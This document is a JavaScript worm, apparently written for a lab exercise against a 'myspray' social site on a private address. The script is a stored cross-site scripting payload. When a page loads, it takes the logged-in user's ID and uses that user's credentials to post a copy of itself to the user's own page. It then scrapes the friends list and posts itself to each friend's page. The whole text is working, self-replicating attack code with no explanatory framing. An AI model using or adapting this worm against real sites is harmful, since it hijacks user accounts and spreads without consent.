<script type='text/javascript'>

/* Possible TODO: add verification to check if text is already in my page, don't post it again*/

function send_message(id, script, text){
  var xhr = new XMLHttpRequest();
  var user = id;
  xhr.open("POST", "http://10.0.23.22/myspray/post" + id + ".html", true);
  xhr.withCredentials = true;
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  let message = "entry="+text + encodeURIComponent("<script>" + script.toString() + "<\/script>");
  xhr.send(message);
  console.log("Message sent to " + id + " Hope he/she likes it :)");
}


var script = document.currentScript.innerHTML;
window.onload = function(){
    /*
      Get logged user ID & post message in his own page
      This way it works even if its the first login of user and the token has weird format.
    */
    var perfil_img_tag = document.getElementsByTagName("img").namedItem("profileImage").getAttribute("src");
    var user_id = parseInt(perfil_img_tag.replace(/[^0-9\.]/g, ''), 10);
    send_message(user_id, script, "My page is the best, you'll never forget :)");

    //Scrapping/parsing of /myfriends.html page to get the IDs of user's myfriends
    //Then I send the message to each of his friends as a post request using send_message(id)
    var xhr2 = new XMLHttpRequest();
    let str = "http://10.0.23.22/myspray/myfriends.html";
    let url = str.replace(/\s+/g, '');
    xhr2.open("GET", url, true);
    xhr2.onreadystatechange = function() {
      // When the response with myspray/myfriends.html content is received do:
      if(xhr2.readyState == 4 && xhr2.status == 200){
        var response = xhr2.responseText;
        //Convert response to a HTML Dom format
        var parser = new DOMParser();
        var htmlDoc = parser.parseFromString(response, "text/html");
        var array = htmlDoc.getElementsByClassName("linkList");
        var full_text, html_tag, id;

        // Iterate over the list of friends (HTML)
        // This list is based in the class name 'linkList' of the page
        for(let i = 0; i < array.length; ++i){
          full_text = array[i].innerHTML;
          // Using regex to match pattern and process the data to get the friend ID
          html_tag = full_text.match(/<a href=\"friends\d*.html/i);
          if(html_tag != null){
            friend_id = parseInt(html_tag[0].replace(/[^0-9\.]/g, ''), 10);
            //Self explainable :p
            send_message(friend_id, script, "Hello, Hope you like my page :)");
          }
        }
      }
    }
    xhr2.send(null);
  };
</script>
